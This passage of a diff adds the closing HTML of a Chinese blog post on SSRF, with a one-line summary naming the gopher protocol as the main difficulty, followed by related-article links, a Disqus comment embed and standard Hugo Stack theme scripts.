+	srcset="/p/ssrf/image-20250402135021970_hu14207151660404920509.png 480w, /p/ssrf/image-20250402135021970_hu11041534620721721050.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250402135021970"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="294"
+		data-flex-basis="705px"
+	
+></p>
+<h1 id="三小结">三、小结
+</h1><p>​	ssrf主要难点就是gopher协议，考点大多也是gopher，所以小结就写到这里。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透知识点汇总</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/awdawdp%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AWD|AWDP从零到一</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E8%87%AA%E4%B8%BB%E7%A0%94%E7%A9%B6%E6%96%B0%E5%8F%91%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">自主研究新发现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nodejs/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NodeJS</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
